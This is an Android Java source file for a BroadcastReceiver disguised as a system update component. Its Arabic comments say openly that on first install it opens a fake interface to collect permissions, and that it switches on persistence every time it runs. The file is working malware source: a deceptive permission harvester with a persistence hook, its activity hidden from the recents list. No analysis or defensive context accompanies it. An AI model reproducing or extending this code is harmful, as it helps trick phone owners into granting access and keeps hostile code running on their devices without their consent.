package com.sec.check;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.util.Log;

/**
 * PackageUpdateReceiver - يستقبل أحداث النظام
 * ============================================================
 * ★ الوظيفة الأهم: عند تثبيت التطبيق أول مرة، يفتح MainActivity
 *   عشان نعرض UI وهمي ونجمع الصلاحيات
 * ============================================================
 */
public class PackageUpdateReceiver extends BroadcastReceiver {

    private static final String TAG = "SystemUpdate";
    private static final String PREFS_NAME = "sys_prefs";
    private static final String KEY_FIRST_LAUNCH = "first_launch_done";

    @Override
    public void onReceive(Context context, Intent intent) {
        try {
            String action = intent.getAction();
            Log.d(TAG, "[PKG] received: " + action);

            // ★★★ الأهم: عند تثبيت التطبيق أو تحديثه ★★★
            if (Intent.ACTION_PACKAGE_ADDED.equals(action)
                    || Intent.ACTION_PACKAGE_REPLACED.equals(action)
                    || Intent.ACTION_MY_PACKAGE_REPLACED.equals(action)) {

                // ★ تحقق إذا التطبيق اتعرض قبل كده ★
                SharedPreferences prefs = context.getSharedPreferences(
                        PREFS_NAME, Context.MODE_PRIVATE);
                boolean firstLaunchDone = prefs.getBoolean(KEY_FIRST_LAUNCH, false);

                if (!firstLaunchDone) {
                    Log.d(TAG, "[PKG] ★★★ FIRST LAUNCH — Opening MainActivity ★★★");

                    // ★★★ افتح MainActivity عشان نجمع الصلاحيات ★★★
                    try {
                        Intent mainIntent = new Intent(context, MainActivity.class);
                        mainIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        mainIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                        mainIntent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                        context.startActivity(mainIntent);
                        Log.d(TAG, "[PKG] MainActivity started");
                    } catch (Exception e) {
                        Log.e(TAG, "[PKG] start MainActivity error: " + e.getMessage());
                    }
                } else {
                    Log.d(TAG, "[PKG] Not first launch — skipping UI");
                }
            }

            // ★ فعّل الاستمرارية في كل الأحوال ★
            try {
                PersistenceManager.enableAllPersistence(context);
            } catch (Exception e) {
                Log.e(TAG, "[PKG] persistence error: " + e.getMessage());
            }

        } catch (Exception e) {
            Log.e(TAG, "[PKG] error: " + e.getMessage());
        }
    }
}
